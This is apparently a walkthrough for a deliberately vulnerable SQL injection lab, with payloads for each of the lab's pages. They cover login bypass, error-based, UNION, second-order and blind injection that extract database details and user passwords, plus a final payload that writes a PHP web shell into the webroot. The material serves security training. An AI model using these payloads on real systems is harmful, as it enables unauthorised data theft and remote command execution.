# Walkthrough document
This document explains the different attacks that can be done on this setup

## Registration
Use the register.php to create users

## Login bypass attack
Bypassing login using boolean expressions

1. **Page:** login1.php
   **Attack:** 
   
```
- ' OR 1=1 -- // 
- admin' OR 1=1 -- // 
```

2. **Page:** login2.php
    **Attack:** 

```
- admin') -- //  
```

## Verbose SQL Error based Injection
Forcing error conditions to reveal and extract data
1. **Page:** login1.php 
   **Attack:**

```
- ' or 1 in (select @@version) -- //
- ' or 1=CAST((select group_concat(table_name) from information_schema.columns) AS SIGNED) -- //
- ' or 1 in (select password from users where username = 'admin') -- //
```

## Extracting data using UNION queries
Using a pre existing SQL select query to fetch additional data from the DB
1. **Page:** searchproducts.php 
   **Attack:**

```
- ' order by 5 -- //
- ' union select 1,2,3,4,5 -- //
- ' union select null, null, database(), user(), @@version -- //
- ' union select null, table_name, column_name, table_schema, null from information_schema.columns -- //
- ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
- ' union select null, id, username, password, fname from users -- //
```

## Second order SQL injection
User input is stored and reused as is in a different function that has no protection
1. **Page:** secondorder_register.php
**Attack:**

```
- ' or 1 in (select @@version) -- //
- ' or 1 in (select password from users where username='admin') -- //
- ' or 1 in (select convert(password,unsigned) from users where username='admin') -- //
- navigate to secondorder_changepass.php
```

## Blind SQL injection
1. **Page:** blindsqli.php
**Attack:**

```
- ?user=1' and 1=1 -- //
- ?user=admin' and substring((select table_name from information_schema.columns where column_name = 'password' LIMIT 1),1,1)>'a' -- // 
- ?user=1' union select 1,2,3,4, if (substring(username,1,1) > 'd', benchmark(100000000, encode('txt','secret')),null) from users where id=1 -- // 
``` 

## OS interaction
1. **Page:** os_sqli.php 
**Attack:** 

```
- ?user=qqqq' union select null, null, null, '<pre><?php system($_GET[\'cmd\']); ?></pre>', null into outfile '/path/to/webroot/writable/dir/shell.php' -- //
```